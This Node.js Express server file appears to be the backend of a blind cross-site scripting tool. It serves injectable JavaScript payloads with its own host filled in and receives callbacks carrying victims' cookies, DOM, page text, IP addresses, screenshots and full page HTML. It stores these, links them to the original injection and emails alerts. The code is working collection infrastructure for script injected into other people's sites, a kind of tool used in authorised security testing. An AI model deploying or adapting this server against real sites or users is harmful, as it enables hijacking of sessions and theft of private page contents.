const bodyParser = require('body-parser');
const express = require('express');
const fs = require('fs');
const zlib = require('zlib');
const path = require('path');
const asyncfs = require('fs').promises;
const uuid = require('uuid');
const database = require('./database.js');
const Settings = database.Settings;
const PayloadFireResults = database.PayloadFireResults;
const CollectedPages = database.CollectedPages;
const InjectionRequests = database.InjectionRequests;
const sequelize = database.sequelize;
const notification = require('./notification.js');
const api = require('./api.js');
const validate = require('express-jsonschema').validate;
const constants = require('./constants.js');
const multer = require('multer');
const upload = multer({ dest: '/tmp/' });  // Multer middleware

const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR);
const SCREENSHOT_FILENAME_REGEX = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i);

function set_secure_headers(req, res) {
    res.set('X-XSS-Protection', 'mode=block');
    res.set('X-Content-Type-Options', 'nosniff');
    res.set('X-Frame-Options', 'deny');

    if (req.path.startsWith(constants.API_BASE_PATH)) {
        res.set('Content-Security-Policy', "default-src 'none'; script-src 'none'");
        res.set('Content-Type', 'application/json');
    }
}

async function check_file_exists(file_path) {
    try {
        await asyncfs.access(file_path, fs.constants.F_OK);
        return true;
    } catch {
        return false;
    }
}

// Load XSS payload from file into memory
const XSS_PAYLOAD = fs.readFileSync(path.join(__dirname, 'probe.js'), 'utf8');
const PROBE_Z_PAYLOAD_TEMPLATE = fs.readFileSync(path.join(__dirname, 'probe_z.js'), 'utf8');

async function get_app_server() {
    const app = express();

    app.set('case sensitive routing', true);

    // Reject any requests with uppercase characters in path
    app.use(async (req, res, next) => {
        if (req.path === req.path.toLowerCase()) {
            return next();
        }
        res.status(401).json({
            success: false,
            error: 'No.',
            code: 'WHY_ARE_YOU_SHOUTING',
        }).end();
    });

    app.use(bodyParser.json());

    app.use(async (req, res, next) => {
        set_secure_headers(req, res);
        next();
    });

    // Handler for collected HTML pages - /page_callback POST
    const CollectedPagesCallbackSchema = {
        type: 'object',
        properties: {
            uri: { type: 'string', default: '' },
            html: { type: 'string', default: '' },
        },
    };

    app.post('/page_callback', upload.none(), validate({ body: CollectedPagesCallbackSchema }), async (req, res) => {
        res.set({
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-Requested-With',
            'Access-Control-Max-Age': '86400',
        });

        await CollectedPages.create({
            id: uuid.v4(),
            uri: req.body.uri,
            html: req.body.html,
        });

        // Immediate response
        res.status(200).json({ status: 'success' }).end();
    });

    // Handler for JS payload data - /js_callback POST
    const JSCallbackSchema = {
        type: 'object',
        properties: {
            uri: { type: 'string', default: '' },
            cookies: { type: 'string', default: '' },
            referrer: { type: 'string', default: '' },
            'user-agent': { type: 'string', default: '' },
            'browser-time': { type: 'string', default: '0', pattern: '^\\d+$' },
            'probe-uid': { type: 'string', default: '' },
            origin: { type: 'string', default: '' },
            injection_key: { type: 'string', default: '' },
            title: { type: 'string', default: '' },
            text: { type: 'string', default: '' },
            was_iframe: { type: 'string', enum: ['true', 'false'], default: 'false' },
            dom: { type: 'string', default: '' },
        },
    };

    app.post('/js_callback', upload.single('screenshot'), validate({ body: JSCallbackSchema }), async (req, res) => {
        res.set({
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-Requested-With',
            'Access-Control-Max-Age': '86400',
        });

        // Respond immediately to the caller
        res.status(200).json({ status: 'success' }).end();

        if (!req.file) {
            console.warn('No screenshot file uploaded with the payload fire.');
            return;
        }

        const payload_fire_image_id = uuid.v4();
        const payload_fire_image_filename = path.join(SCREENSHOTS_DIR, `${payload_fire_image_id}.png.gz`);
        const multer_temp_image_path = req.file.path;

        // Create gzip stream to compress the screenshot
        try {
            const gzip = zlib.createGzip();
            const output_gzip_stream = fs.createWriteStream(payload_fire_image_filename);
            const input_read_stream = fs.createReadStream(multer_temp_image_path);

            input_read_stream.pipe(gzip).pipe(output_gzip_stream).on('finish', async (error) => {
                if (error) {
                    console.error('Error writing gzipped screenshot:', error);
                }
                try {
                    console.log(`Gzip complete, deleting multer temp file: ${multer_temp_image_path}`);
                    await asyncfs.unlink(multer_temp_image_path);
                } catch (unlinkError) {
                    console.error('Failed to delete multer temp file:', unlinkError);
                }
            });
        } catch (err) {
            console.error('Exception during gzip processing:', err);
        }

        const payload_fire_id = uuid.v4();
        let payload_fire_data = {
            id: payload_fire_id,
            url: req.body.uri,
            ip_address: req.connection.remoteAddress ? req.connection.remoteAddress.toString() : '',
            referer: req.body.referrer,
            user_agent: req.body['user-agent'],
            cookies: req.body.cookies,
            title: req.body.title,
            dom: req.body.dom,
            text: req.body.text,
            origin: req.body.origin,
            screenshot_id: payload_fire_image_id,
            was_iframe: (req.body.was_iframe === 'true'),
            browser_timestamp: parseInt(req.body['browser-time'], 10),
            correlated_request: 'No correlated request found for this injection.',
        };

        // Correlated request lookup
        try {
            const correlated_request_rec = await InjectionRequests.findOne({
                where: { injection_key: req.body.injection_key },
            });
            if (correlated_request_rec) {
                payload_fire_data.correlated_request = correlated_request_rec.request;
            }
        } catch (err) {
            console.error('Error fetching correlated request:', err);
        }

        // Store in DB
        try {
            await PayloadFireResults.create(payload_fire_data);

            // Send notifications if enabled
            if (process.env.SMTP_EMAIL_NOTIFICATIONS_ENABLED === 'true') {
                payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
                await notification.send_email_notification(payload_fire_data);
            }
        } catch (err) {
            console.error('Error storing payload fire result or sending notification:', err);
        }
    });

    // Serve gzipped screenshots
    app.get('/screenshots/:screenshotFilename', async (req, res) => {
        const screenshotFilename = req.params.screenshotFilename;

        if (!SCREENSHOT_FILENAME_REGEX.test(screenshotFilename)) {
            return res.sendStatus(404);
        }

        const gzImagePath = path.join(SCREENSHOTS_DIR, `${screenshotFilename}.gz`);
        const imageExists = await check_file_exists(gzImagePath);
        if (!imageExists) {
            return res.sendStatus(404);
        }

        res.sendFile(gzImagePath, {
            lastModified: false,
            acceptRanges: false,
            cacheControl: true,
            headers: {
                'Content-Type': 'image/png',
                'Content-Encoding': 'gzip',
            },
        });
    });

    // Serve the probe_z.js payload with HOST_URL replaced dynamically
    app.get('/z', (req, res) => {
        const hostUrl = `https://${process.env.HOSTNAME}`;
        const replacedPayload = PROBE_Z_PAYLOAD_TEMPLATE.replace(/\[HOST_URL\]/g, hostUrl);

        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.send(replacedPayload);
    });

    // Health check endpoint
    app.get('/health', async (req, res) => {
        try {
            await sequelize.authenticate();
            res.status(200).json({ status: 'ok' }).end();
        } catch (error) {
            console.error('Database connection test error (/health):', error);
            res.status(500).json({ status: 'error' }).end();
        }
    });

    // The standard main XSS payload endpoint
    const payload_handler = async (req, res) => {
        res.set({
            'Content-Security-Policy': "default-src 'none'; script-src 'none'",
            'Content-Type': 'application/javascript',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, X-Requested-With',
            'Access-Control-Max-Age': '86400',
        });

        const [pagesSetting, chainloadSetting] = await Promise.all([
            Settings.findOne({ where: { key: constants.PAGES_TO_COLLECT_SETTINGS_KEY } }),
            Settings.findOne({ where: { key: constants.CHAINLOAD_URI_SETTINGS_KEY } }),
        ]);

        const pages_to_collect = pagesSetting ? JSON.parse(pagesSetting.value) : [];
        const chainload_uri = chainloadSetting ? chainloadSetting.value : '';

        let responsePayload = XSS_PAYLOAD
            .replace(/\[HOST_URL\]/g, `https://${process.env.HOSTNAME}`)
            .replace('[COLLECT_PAGE_LIST_REPLACE_ME]', JSON.stringify(pages_to_collect))
            .replace('[CHAINLOAD_REPLACE_ME]', JSON.stringify(chainload_uri))
            .replace('[PROBE_ID]', JSON.stringify(req.params.probe_id));

        res.send(responsePayload);
    };

    app.get('/', payload_handler);

    if (process.env.CONTROL_PANEL_ENABLED === 'true') {
        await api.set_up_api_server(app); // Mount API and static assets
    } else {
        console.log('[INFO] Control panel NOT enabled. Only notification server is running.');
    }

    app.get('/:probe_id', payload_handler);

    return app;
}

module.exports = get_app_server;
